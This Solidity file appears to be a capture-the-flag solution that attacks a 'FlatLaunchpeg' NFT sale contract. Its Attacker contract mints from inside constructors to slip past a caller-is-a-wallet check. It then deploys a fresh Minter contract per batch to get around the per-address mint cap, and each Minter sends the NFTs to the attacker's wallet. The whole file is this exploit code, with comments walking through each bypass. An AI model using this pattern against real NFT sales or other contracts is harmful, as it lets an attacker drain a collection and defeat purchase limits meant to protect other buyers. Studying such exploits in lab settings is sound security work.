pragma solidity ^0.8.4;

import "./FlatLaunchpeg.sol";

contract Attacker {
    FlatLaunchpeg immutable victim;

    constructor(FlatLaunchpeg _victim) {
        victim = _victim;
        //To avoid the first safeguard that checks wether msg.sender is an eoa we're simply calling the attack method from the contract. Hence at this stage there is no bytecode beeing deployed
        attack();
    }

    function attack() private {
        //Due to the fact that each address can just mint 5 NFTS we're going to create a new contract for each batch of 5 NFTS
        uint256 end = (victim.collectionSize() /
            victim.maxPerAddressDuringMint()) + 1;
        for (uint256 i = 0; i < end; i++) {
            //If there a more than 5 NFTS left we're going to mint 5, otherwise we're going to mint the remaining NFTS
            uint256 quantity = victim.collectionSize() - victim.totalSupply() >
                victim.maxPerAddressDuringMint()
                ? victim.maxPerAddressDuringMint()
                : victim.collectionSize() - victim.totalSupply();

            new Minter(victim, i, quantity);
        }
    }
}

contract Minter {
    FlatLaunchpeg immutable victim;
    uint256 idx;
    uint256 immutable quantity;

    constructor(
        FlatLaunchpeg _victim,
        uint256 _idx,
        uint256 _quantity
    ) {
        victim = _victim;
        idx = _idx;
        quantity = _quantity;
        //To avoid the first safeguard that checks wether msg.sender is an eoa we're simply calling the attack method from the contract. Hence at this stage there is no bytecode beeing deployed
        mint();
    }

    function mint() private {
        //Mint the given amount of NFTS
        victim.publicSaleMint{value: msg.value}(quantity);
        for (uint256 i = 0; i < quantity; i++) {
            //Send them to the attacker EOA using tx.origin
            victim.transferFrom(
                address(this),
                tx.origin,
                idx * victim.maxPerAddressDuringMint() + i
            );
        }
    }
}
